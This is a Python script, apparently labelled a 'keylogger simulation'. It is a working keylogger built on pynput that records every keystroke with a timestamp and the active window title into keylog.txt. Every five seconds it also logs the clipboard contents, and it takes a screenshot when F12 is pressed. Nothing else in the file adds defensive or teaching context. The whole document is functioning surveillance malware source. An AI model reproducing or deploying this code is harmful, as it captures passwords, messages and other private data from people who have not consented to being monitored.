import time
import os
from pynput import keyboard

LOG_FILE = "keylog.txt"

def get_active_window():
    try:
        return os.popen('xdotool getactivewindow getwindowname').read().strip()
    except Exception:
        return "N/A"

def log_clipboard():
    try:
        clipboard = os.popen('xclip -o -selection clipboard').read().strip()
        if clipboard:
            with open(LOG_FILE, "a") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] CLIPBOARD: {clipboard}\n")
    except Exception:
        pass

def take_screenshot():
    try:
        fname = "screenshot-{}.png".format(time.strftime('%Y%m%d-%H%M%S'))
        os.system(f"scrot {fname}")
    except Exception:
        pass

def on_press(key):
    window = get_active_window()
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} - {window} - {k}\n")
    # Example screenshot trigger: F12 key
    if k == 'Key.f12':
        take_screenshot()

def main():
    print("[*] Keylogger simulation started (Ctrl+C to stop).")
    print("[*] Press F12 to manually trigger screenshot.")
    last_clipboard = ""
    # Start keyboard listener in background
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    try:
        while True:
            log_clipboard()
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[!] Simulation ended.")

if __name__ == "__main__":
    main()

